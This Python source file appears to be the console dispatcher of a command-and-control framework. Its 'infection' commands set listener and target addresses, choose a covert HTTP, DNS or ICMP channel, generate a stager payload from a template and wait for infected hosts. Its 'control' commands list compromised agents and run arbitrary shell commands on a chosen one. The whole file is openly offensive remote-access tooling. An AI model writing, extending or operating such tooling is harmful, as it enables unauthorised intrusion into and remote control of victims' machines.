from os import environ
from auxiliary.interface import *
from auxiliary.options import *
from modules.infection import *
from modules.control import *
import threading

infection = ['set', 'unset', 'options', 'make', 'wait']
control = ['agents', 'use', 'cmd', 'kill']
general = ['help', '?', 'mode', 'exit']

payload = Payload()
agent = Agent(payload)

def execute(args):
    global payload
    global agent
    
    mode = environ.get('MODE', '')

    if args[0] in general:

        if args[0] == 'help' or args[0] == '?':
            if 'CONTROL' in mode:
                return Help.control
            if 'INFECTION' in mode:
                return Help.infection
            return Help.general

        if args[0] == 'exit':
            raise KeyboardInterrupt

        if args[0] == 'mode':
            if len(args) == 2:
                if args[1].upper() == 'INFECTION':
                    environ['MODE'] = '(INFECTION)'
                    return ''

                elif args[1].upper() == 'CONTROL':
                    environ['MODE'] = '(CONTROL)'
                    return ''
                    
            return error('Use: mode <infection|control>')

    if args[0] in infection:
        
        if 'INFECTION' not in mode:
            return error('Enter in Infection Mode!')

        if args[0] == 'set':
            if len(args) == 3:
                if args[1].upper() == 'LHOST':
                    payload.setLHOST(args[2])
                elif args[1].upper() == 'LPORT':
                    payload.setLPORT(args[2])
                elif args[1].upper() == 'RHOST':
                    payload.setRHOST(args[2])
                elif args[1].upper() == 'CHANNEL':
                    if args[2].upper() in ['HTTP', 'DNS', 'ICMP']:
                        payload.setCHANNEL(args[2].upper())
                    else:
                        return error('Accepted channels: HTTP, DNS, ICMP')
                else:
                    return error('Invalid option, check with: options')
                return args[1]+ ' => ' + args[2]
            return error('Use: set <option> <value>')
        
        if args[0] == 'unset':
            if args[1].upper() in ['LHOST', 'LPORT', 'RHOST', 'RPORT']:
                environ.pop(args[1].upper(), None)
                return ''
            return error('Use: unset <option>')

        if args[0] == 'options':
            return Options.payload(payload)

        if args[0] == 'make':
            with open('stagers/icmp.py', 'r') as f, open(f'stagers/payloads/{payload.rhost}_{payload.channel}.py', 'w') as out:
                out.write(f.read().replace('CLIENTIP', payload.rhost).replace('SERVERIP', payload.lhost))
            return info(f'Created at stagers/payloads/{payload.rhost}_{payload.channel}.py')

        if args[0] == 'wait':
            thread = threading.Thread(target=payload.init, args=(payload.lhost, payload.lport, payload.rhost, payload.channel,))
            thread.start()
            return info('Waiting infection in background...\n')


    if args[0] in control:

        if 'CONTROL' not in mode:
            return error('Enter in Control Mode!')

        if args[0] == 'agents':
            agent = Agent(payload)
            sessions = ''
            for session in agent.list():
                sessions += f'{session}\n'
            return info(sessions)
        
        if args[0] == 'use':
            if len(args) == 3:
                agent.load(args[1], args[2].upper())
                return ''
            else:
                return error('Use: use <ip_addr> <channel>')

        if args[0] == 'cmd':
            if len(args) >= 2:
                command = ' '.join(args[1:])
                agent.exec(command)
                return ''
            else:
                return error('Use: cmd <command>')


    return error('Command not found.\nTry: help')

